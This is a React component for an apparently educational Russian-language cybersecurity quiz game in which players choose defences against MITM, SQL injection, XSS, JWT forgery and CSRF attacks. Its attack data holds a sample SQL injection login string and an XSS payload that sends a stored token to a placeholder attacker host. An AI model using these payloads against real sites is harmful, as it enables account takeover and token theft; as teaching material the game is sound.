import { useState, useEffect, useCallback } from 'react';
import {
  ShieldAlert,
  ShieldCheck,
  Lock,
  KeyRound,
  Wifi,
  Bug,
  Swords,
  Trophy,
  RotateCcw,
  Zap,
  Terminal,
  XCircle,
  CheckCircle2,
} from 'lucide-react';
import { useGame, XP_REWARDS } from '@/context/GameContext';

// ============================================================
// Модуль: CyberSec Battle Mode — мини-игра защиты от атак
// Игрок отбивает хакерские атаки, выбирая правильные защиты
// ============================================================

interface Attack {
  id: number;
  name: string;
  description: string;
  threatLog: string;
  correctDefense: string;
  options: string[];
  explanation: string;
}

const ATTACKS: Attack[] = [
  {
    id: 1,
    name: 'Перехват незашифрованного запроса (MITM)',
    description: 'Хакер перехватывает HTTP-запрос между приложением и сервером. Токен передаётся в открытом виде!',
    threatLog: '[ALERT] MITM-атака: перехвачен запрос GET /api/v1/users\n  Authorization: Bearer eyJhb... (plaintext)\n  Хакер видит токен сессии!',
    correctDefense: 'Активировать HTTPS (TLS/SSL)',
    options: [
      'Активировать HTTPS (TLS/SSL)',
      'Добавить заголовок X-Request-ID',
      'Увеличить таймаут запроса',
      'Отключить кэширование',
    ],
    explanation: 'HTTPS шифрует весь трафик между клиентом и сервером через TLS. Даже если хакер перехватит пакеты, он увидит только зашифрованные данные. Токен останется в безопасности.',
  },
  {
    id: 2,
    name: 'SQL-инъекция через поле ввода',
    description: 'Хакер вводит恶意 SQL-код в поле логина: admin\' OR \'1\'=\'1 --. Сервер выполняет подделанный запрос!',
    threatLog: '[ALERT] SQL Injection: обнаружена инъекция\n  Input: admin\' OR \'1\'=\'1 --\n  Query: SELECT * FROM users WHERE name=\'admin\' OR \'1\'=\'1\'\n  УБЫЛО: возвращены ВСЕ пользователи!',
    correctDefense: 'Использовать параметризованные запросы (Prepared Statements)',
    options: [
      'Использовать параметризованные запросы (Prepared Statements)',
      'Добавить CORS-заголовок',
      'Включить gzip-сжатие',
      'Увеличить длину пароля',
    ],
    explanation: 'Параметризованные запросы разделяют SQL-код и пользовательский ввод. Значения передаются как параметры, а не вставляются в строку запроса. Инъекция становится невозможной.',
  },
  {
    id: 3,
    name: 'XSS-атака через пользовательский контент',
    description: 'Хакер вставляет <script>stealToken()</script> в поле комментария. Другие пользователи выполняют этот скрипт!',
    threatLog: '[ALERT] XSS-атака: вредоносный скрипт в комментариях\n  Payload: <script>fetch("hacker.io/steal?token="+localStorage.token)</script>\n  Скрипт выполнится у всех, кто откроет страницу!',
    correctDefense: 'Экранировать HTML и использовать Content-Security-Policy',
    options: [
      'Экранировать HTML и использовать Content-Security-Policy',
      'Перейти на HTTP/2',
      'Добавить favicon',
      'Использовать WebP-изображения',
    ],
    explanation: 'HTML-экранирование преобразует <script> в &lt;script&gt;, блокируя выполнение. Content-Security-Policy запрещает загрузку inline-скриптов. Двойная защита от XSS.',
  },
  {
    id: 4,
    name: 'Подделка JWT-токена (Token Forgery)',
    description: 'Хакер меняет payload JWT: {"role":"admin"} и отправляет модифицированный токен. Сервер должен обнаружить подделку!',
    threatLog: '[ALERT] JWT Forgery: обнаружен поддельный токен\n  Original payload: {"sub":"user_42","role":"user"}\n  Modified payload: {"sub":"user_42","role":"admin"}\n  Signature не совпадает с секретным ключом!',
    correctDefense: 'Проверять подпись JWT на сервере с секретным ключом',
    options: [
      'Проверять подпись JWT на сервере с секретным ключом',
      'Увеличить длину токена',
      'Использовать cookies вместо заголовков',
      'Добавить rate limiting',
    ],
    explanation: 'JWT подписывается HMAC-SHA256 с секретным ключом сервера. Любое изменение payload делает подпись невалидной. Сервер отклоняет токен с неверной подписью — атака отражена.',
  },
  {
    id: 5,
    name: 'CSRF-атака через сторонний сайт',
    description: 'Пользователь посещает вредоносный сайт, который отправляет POST-запрос к API от его имени. Сессия пользователя используется без его ведома!',
    threatLog: '[ALERT] CSRF-атака: межсайтовая подделка запроса\n  Origin: evil-website.com\n  Request: POST /api/v1/transfer\n  Cookies пользователя автоматически прикреплены!\n  Транзакция выполняется от лица жертвы!',
    correctDefense: 'Использовать SameSite cookies + CSRF-токен',
    options: [
      'Использовать SameSite cookies + CSRF-токен',
      'Включить минификацию JS',
      'Добавить CDN для статики',
      'Использовать lazy loading',
    ],
    explanation: 'SameSite=Lax/Strict запрещает браузеру отправлять cookies в межсайтовых запросах. CSRF-токен — уникальное значение, которое проверяется сервером. Двойная защита от подделки.',
  },
];

type GameState = 'idle' | 'under-attack' | 'defending' | 'victory' | 'defeat';

export default function CyberBattleModule() {
  const { addXp, unlockAchievement, isAchievementUnlocked } = useGame();
  const [gameState, setGameState] = useState<GameState>('idle');
  const [currentAttackIndex, setCurrentAttackIndex] = useState(0);
  const [securityScore, setSecurityScore] = useState(0);
  const [selectedDefense, setSelectedDefense] = useState<string | null>(null);
  const [showExplanation, setShowExplanation] = useState(false);
  const [blockedCount, setBlockedCount] = useState(0);
  const [battleLog, setBattleLog] = useState<string[]>([]);
  const [showVictory, setShowVictory] = useState(false);

  const currentAttack = ATTACKS[currentAttackIndex];
  const totalAttacks = ATTACKS.length;
  const scorePerBlock = Math.round(100 / totalAttacks);

  const startGame = useCallback(() => {
    setGameState('under-attack');
    setCurrentAttackIndex(0);
    setSecurityScore(0);
    setBlockedCount(0);
    setSelectedDefense(null);
    setShowExplanation(false);
    setBattleLog([`[${new Date().toLocaleTimeString('en-GB')}] ⚠ Обнаружена серия хакерских атак! ${totalAttacks} угроз активированы.`]);
    setShowVictory(false);
  }, [totalAttacks]);

  const selectDefense = (defense: string) => {
    if (gameState !== 'under-attack' || selectedDefense !== null) return;
    setSelectedDefense(defense);
    setGameState('defending');

    const isCorrect = defense === currentAttack.correctDefense;

    setTimeout(() => {
      if (isCorrect) {
        const newScore = Math.min(100, securityScore + scorePerBlock);
        const newBlocked = blockedCount + 1;
        setSecurityScore(newScore);
        setBlockedCount(newBlocked);
        setBattleLog((prev) => [
          ...prev,
          `[${new Date().toLocaleTimeString('en-GB')}] ✓ Атака #${currentAttack.id} отражена! +${scorePerBlock}% к защищённости.`,
        ]);
      } else {
        setBattleLog((prev) => [
          ...prev,
          `[${new Date().toLocaleTimeString('en-GB')}] ✗ Неправильная защита! Атака #${currentAttack.id} прорвалась.`,
        ]);
      }
      setShowExplanation(true);
    }, 800);
  };

  const nextAttack = () => {
    if (currentAttackIndex + 1 >= totalAttacks) {
      // Игра окончена
      const allBlocked = blockedCount === totalAttacks;
      if (allBlocked) {
        setGameState('victory');
        setShowVictory(true);
        setBattleLog((prev) => [
          ...prev,
          `[${new Date().toLocaleTimeString('en-GB')}] 🏆 Все атаки отражены! Система защищена на 100%!`,
        ]);
        addXp(XP_REWARDS.CYBER_ALL_BLOCKED, 'Полная кибер-защита');
        if (!isAchievementUnlocked('cyber-defender')) {
          unlockAchievement('cyber-defender');
        }
      } else {
        setGameState('defeat');
        setBattleLog((prev) => [
          ...prev,
          `[${new Date().toLocaleTimeString('en-GB')}] Система уязвима. Защищённость: ${securityScore}%. Попробуйте снова!`,
        ]);
      }
    } else {
      setCurrentAttackIndex((i) => i + 1);
      setSelectedDefense(null);
      setShowExplanation(false);
      setGameState('under-attack');
    }
  };

  const reset = () => {
    setGameState('idle');
    setCurrentAttackIndex(0);
    setSecurityScore(0);
    setBlockedCount(0);
    setSelectedDefense(null);
    setShowExplanation(false);
    setBattleLog([]);
    setShowVictory(false);
  };

  // XP за отражение одной атаки
  useEffect(() => {
    if (showExplanation && selectedDefense === currentAttack.correctDefense) {
      addXp(XP_REWARDS.CYBER_ATTACK_BLOCKED, 'Отражена атака');
    }
  }, [showExplanation, selectedDefense, currentAttack.correctDefense, addXp]);

  return (
    <div className="flex flex-col gap-5">
      {/* Заголовок */}
      <div className="flex items-center gap-3">
        <div className={`w-10 h-10 rounded-lg flex items-center justify-center border transition-all ${
          gameState === 'under-attack'
            ? 'bg-rose-500/20 border-rose-500/50 animate-shake'
            : gameState === 'victory'
              ? 'bg-emerald-500/20 border-emerald-500/50'
              : 'bg-slate-800 border-slate-700'
        }`}>
          <Swords className={`w-5 h-5 ${
            gameState === 'under-attack' ? 'text-rose-400' : gameState === 'victory' ? 'text-emerald-400' : 'text-slate-400'
          }`} />
        </div>
        <div>
          <h2 className="text-lg font-bold text-slate-100">CyberSec Battle Mode</h2>
          <p className="text-[12px] text-slate-500 font-mono">Режим кибер-защиты · отрази все атаки · защити приложение</p>
        </div>
      </div>

      {/* Шкала защищённости приложения */}
      <div className={`rounded-xl border p-5 transition-all duration-500 ${
        gameState === 'under-attack'
          ? 'border-rose-500/30 animate-alarm'
          : gameState === 'victory'
            ? 'border-emerald-500/40'
            : 'border-slate-800'
      }`} style={{ background: 'rgba(13,17,23,0.9)' }}>
        <div className="flex items-center justify-between mb-3">
          <div className="flex items-center gap-2">
            <ShieldCheck className={`w-5 h-5 ${
              securityScore >= 80 ? 'text-emerald-400' : securityScore >= 40 ? 'text-amber-400' : 'text-rose-400'
            }`} />
            <span className="text-[13px] font-bold text-slate-200">
              Защищённость приложения
            </span>
          </div>
          <span className={`text-2xl font-bold font-mono ${
            securityScore >= 80 ? 'text-emerald-400' : securityScore >= 40 ? 'text-amber-400' : 'text-rose-400'
          }`}>
            {securityScore}%
          </span>
        </div>
        <div className="h-3 bg-slate-800 rounded-full overflow-hidden border border-slate-800">
          <div
            className={`h-full rounded-full transition-all duration-700 ${
              securityScore >= 80
                ? 'bg-gradient-to-r from-emerald-500 to-cyan-500'
                : securityScore >= 40
                  ? 'bg-gradient-to-r from-amber-500 to-rose-500'
                  : 'bg-gradient-to-r from-rose-600 to-rose-500'
            }`}
            style={{
              width: `${securityScore}%`,
              boxShadow: securityScore > 0 ? `0 0 10px ${securityScore >= 80 ? 'rgba(52,211,153,0.4)' : securityScore >= 40 ? 'rgba(245,158,11,0.4)' : 'rgba(244,63,94,0.4)'}` : 'none',
            }}
          />
        </div>
        <div className="flex items-center justify-between mt-2">
          <span className="text-[10px] font-mono text-slate-600">
            Отражено: {blockedCount} / {totalAttacks}
          </span>
          <span className="text-[10px] font-mono text-slate-600">
            Угроз осталось: {totalAttacks - currentAttackIndex - (showExplanation ? 1 : 0)}
          </span>
        </div>
      </div>

      {/* Игровое поле */}
      {gameState === 'idle' && (
        <div className="rounded-xl border border-slate-800 bg-[#0D1117] p-8 text-center">
          <ShieldAlert className="w-16 h-16 text-slate-700 mx-auto mb-4" />
          <h3 className="text-lg font-bold text-slate-300 mb-2">Кибер-Защита: Начало</h3>
          <p className="text-[13px] text-slate-500 leading-relaxed max-w-lg mx-auto mb-6">
            На ваше приложение надвигается {totalAttacks} хакерских атак. Ваша задача — выбрать правильную
            защиту для каждой угрозы. За каждый правильный ответ защищённость приложения растёт.
            Отразите все атаки, чтобы достичь 100% защиты!
          </p>
          <button
            onClick={startGame}
            className="inline-flex items-center gap-2 bg-rose-600/80 hover:bg-rose-500 text-white rounded-xl px-6 py-3 text-[14px] font-bold transition-all active:scale-[0.98]"
            style={{ boxShadow: '0 0 12px rgba(244,63,94,0.3)' }}
          >
            <Swords className="w-5 h-5" />
            Начать битву
          </button>
        </div>
      )}

      {/* Атака активна */}
      {(gameState === 'under-attack' || gameState === 'defending') && currentAttack && (
        <div className={`rounded-xl border bg-[#0D1117] p-5 transition-all ${
          gameState === 'under-attack' ? 'border-rose-500/40 animate-shake' : 'border-slate-800'
        }`}>
          {/* Информация об атаке */}
          <div className="flex items-center gap-2 mb-4">
            <Bug className="w-5 h-5 text-rose-400" />
            <h3 className="text-[13px] font-bold text-rose-300 uppercase tracking-wider">
              Атака #{currentAttack.id}: {currentAttack.name}
            </h3>
          </div>

          {/* Лог угрозы */}
          <div className="rounded-lg border border-rose-500/20 bg-rose-500/5 p-4 mb-4">
            <div className="flex items-center gap-2 mb-2">
              <Terminal className="w-3.5 h-3.5 text-rose-500" />
              <span className="text-[10px] font-mono text-rose-400 uppercase tracking-wider">Threat Log</span>
            </div>
            <pre className="text-[11px] font-mono text-rose-300/80 leading-relaxed whitespace-pre-wrap">
              {currentAttack.threatLog}
            </pre>
          </div>

          {/* Описание атаки */}
          <p className="text-[13px] text-slate-300 leading-relaxed mb-4">
            {currentAttack.description}
          </p>

          {/* Варианты защиты */}
          <div className="space-y-2">
            <p className="text-[11px] font-mono text-slate-500 uppercase tracking-wider mb-2">
              Выберите команду защиты:
            </p>
            {currentAttack.options.map((option) => {
              const isSelected = selectedDefense === option;
              const isCorrectOption = option === currentAttack.correctDefense;
              const showResult = showExplanation && isSelected;

              return (
                <button
                  key={option}
                  onClick={() => selectDefense(option)}
                  disabled={selectedDefense !== null}
                  className={`w-full text-left px-4 py-3 rounded-lg border transition-all duration-200 ${
                    showResult && isCorrectOption
                      ? 'border-emerald-500/50 bg-emerald-500/10 text-emerald-300'
                      : showResult && !isCorrectOption
                        ? 'border-rose-500/50 bg-rose-500/10 text-rose-300'
                        : isSelected
                          ? 'border-slate-600 bg-slate-800/60'
                          : selectedDefense !== null
                            ? 'border-slate-800 bg-slate-900/20 opacity-40'
                            : 'border-slate-700 bg-slate-800/30 hover:border-cyan-500/40 hover:bg-cyan-500/5 text-slate-300'
                  }`}
                >
                  <div className="flex items-center gap-2">
                    {showResult && isCorrectOption && <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />}
                    {showResult && !isCorrectOption && isSelected && <XCircle className="w-4 h-4 text-rose-400 shrink-0" />}
                    {!showResult && <Lock className="w-4 h-4 text-slate-600 shrink-0" />}
                    <span className="text-[12px] font-mono">{option}</span>
                  </div>
                </button>
              );
            })}
          </div>

          {/* Объяснение после выбора */}
          {showExplanation && (
            <div className="mt-4 animate-fade-in">
              <div className={`rounded-lg border p-4 ${
                selectedDefense === currentAttack.correctDefense
                  ? 'border-emerald-500/30 bg-emerald-500/5'
                  : 'border-rose-500/30 bg-rose-500/5'
              }`}>
                <div className="flex items-center gap-2 mb-2">
                  {selectedDefense === currentAttack.correctDefense ? (
                    <ShieldCheck className="w-4 h-4 text-emerald-400" />
                  ) : (
                    <ShieldAlert className="w-4 h-4 text-rose-400" />
                  )}
                  <span className={`text-[12px] font-bold ${
                    selectedDefense === currentAttack.correctDefense ? 'text-emerald-300' : 'text-rose-300'
                  }`}>
                    {selectedDefense === currentAttack.correctDefense
                      ? 'Атака отражена! Правильная защита выбрана.'
                      : 'Атака прорвалась! Неправильная защита.'}
                  </span>
                </div>
                <p className="text-[12px] text-slate-400 leading-relaxed mb-3">
                  {currentAttack.explanation}
                </p>
                {selectedDefense !== currentAttack.correctDefense && (
                  <div className="rounded-md bg-slate-900/40 border border-slate-800 px-3 py-2 mb-3">
                    <p className="text-[11px] font-mono text-slate-500">
                      Правильный ответ: <span className="text-emerald-400">{currentAttack.correctDefense}</span>
                    </p>
                  </div>
                )}
                <button
                  onClick={nextAttack}
                  className="flex items-center gap-2 bg-slate-700 hover:bg-slate-600 text-slate-100 rounded-lg px-4 py-2 text-[12px] font-semibold transition-colors active:scale-[0.98]"
                >
                  {currentAttackIndex + 1 >= totalAttacks ? 'Завершить битву' : 'Следующая атака'}
                  <Zap className="w-3.5 h-3.5" />
                </button>
              </div>
            </div>
          )}
        </div>
      )}

      {/* Победа */}
      {gameState === 'victory' && (
        <div className="animate-fade-in rounded-xl border border-emerald-500/40 bg-gradient-to-b from-emerald-500/10 to-transparent p-8 text-center">
          <div className="inline-flex items-center justify-center w-16 h-16 rounded-2xl bg-emerald-500/20 border-2 border-emerald-500/50 mb-4 animate-level-up">
            <Trophy className="w-8 h-8 text-emerald-400" />
          </div>
          <h3 className="text-xl font-bold text-emerald-300 mb-2">Полная защита достигнута!</h3>
          <p className="text-[13px] text-slate-400 leading-relaxed max-w-lg mx-auto mb-4">
            Все {totalAttacks} хакерских атак успешно отражены. Ваше приложение защищено на 100%.
            Вы — настоящий Кибер-защитник!
          </p>
          <div className="inline-flex items-center gap-2 px-4 py-2 rounded-lg bg-emerald-500/10 border border-emerald-500/30 mb-6">
            <Zap className="w-4 h-4 text-emerald-400" />
            <span className="text-[13px] font-mono font-bold text-emerald-300">+{XP_REWARDS.CYBER_ALL_BLOCKED} XP</span>
          </div>
          <div>
            <button
              onClick={reset}
              className="inline-flex items-center gap-2 bg-slate-800 border border-slate-700 text-slate-300 rounded-lg px-4 py-2 text-[12px] font-semibold hover:bg-slate-700 transition-colors"
            >
              <RotateCcw className="w-4 h-4" />
              Играть снова
            </button>
          </div>
        </div>
      )}

      {/* Поражение */}
      {gameState === 'defeat' && (
        <div className="animate-fade-in rounded-xl border border-rose-500/40 bg-rose-500/5 p-8 text-center">
          <ShieldAlert className="w-16 h-16 text-rose-400 mx-auto mb-4" />
          <h3 className="text-lg font-bold text-rose-300 mb-2">Система уязвима</h3>
          <p className="text-[13px] text-slate-500 leading-relaxed max-w-lg mx-auto mb-6">
            Защищённость приложения: {securityScore}%. Не все атаки были отражены.
            Изучите объяснения к каждой атаке и попробуйте снова!
          </p>
          <button
            onClick={startGame}
            className="inline-flex items-center gap-2 bg-rose-600/80 hover:bg-rose-500 text-white rounded-lg px-5 py-2.5 text-[13px] font-bold transition-colors active:scale-[0.98]"
          >
            <RotateCcw className="w-4 h-4" />
            Повторить битву
          </button>
        </div>
      )}

      {/* Боевой лог */}
      {battleLog.length > 0 && gameState !== 'idle' && (
        <div className="rounded-xl border border-slate-800 bg-[#0D1117] overflow-hidden">
          <div className="flex items-center gap-2 px-4 py-2.5 border-b border-slate-800 bg-slate-900/50">
            <Terminal className="w-3.5 h-3.5 text-slate-500" />
            <span className="text-[10px] font-mono text-slate-500 uppercase tracking-wider">
              Боевой лог
            </span>
          </div>
          <div className="px-4 py-3 space-y-1 max-h-40 overflow-y-auto">
            {battleLog.map((entry, i) => (
              <p
                key={i}
                className={`text-[11px] font-mono animate-fade-in ${
                  entry.includes('✓') ? 'text-emerald-400' : entry.includes('✗') ? 'text-rose-400' : entry.includes('🏆') ? 'text-amber-400' : 'text-slate-400'
                }`}
              >
                {entry}
              </p>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}
